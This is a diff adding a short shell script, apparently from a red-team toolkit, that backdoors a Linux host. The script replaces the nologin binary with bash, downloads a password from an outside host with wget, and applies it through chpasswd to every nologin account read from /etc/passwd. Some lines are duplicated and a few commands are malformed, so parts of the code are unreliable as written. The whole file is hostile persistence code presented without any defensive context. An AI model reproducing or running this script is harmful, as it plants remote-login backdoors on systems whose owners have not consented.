@@ -1,0 +1,31 @@
+#!/bin/sh
+web_password=ubredteam.isamotherfucking.ninja/ripjaw/modules/auxillary/default-password
+#!/bin/sh
+web_password=ubredteam.isamotherfucking.ninja/ripjaw/modules/auxillary/default-password
+
+backdoorAccounts()
+{
+	## Replace NoLogin with Bash
+	BIN_BASH=$(which bash)
+	NO_LOGIN=$(which nologin)
+	if [ -f "$BIN_BASH" ]; then
+		if [ -f "$NO_LOGIN" ]; then
+			cp -f "$BIN_BASH" "$NO_LOGIN"
+		else
+			cp -f "$BIN_BASH" /usr/sbin/nologin
+		fi
+	fi
+
+	## Enable new accounts
+	PASSWORD=$(wget -O- $web_password)
+	ACCTS=$(cat /etc/passwd)
+	for ACCT in "${ACCTS[@]}"
+	do
+		if [ $(echo "$ACCT" | grep -Fxq "nologin") ]
+		then
+			NAME=echo $ACCT | grep -Fxq "nologin" && echo $ACCT | cut -d ":" -f 1
+			echo "$NAME:$PASSWORD" | chpasswd
+		fi
+	done
+}
+backdoorAccounts
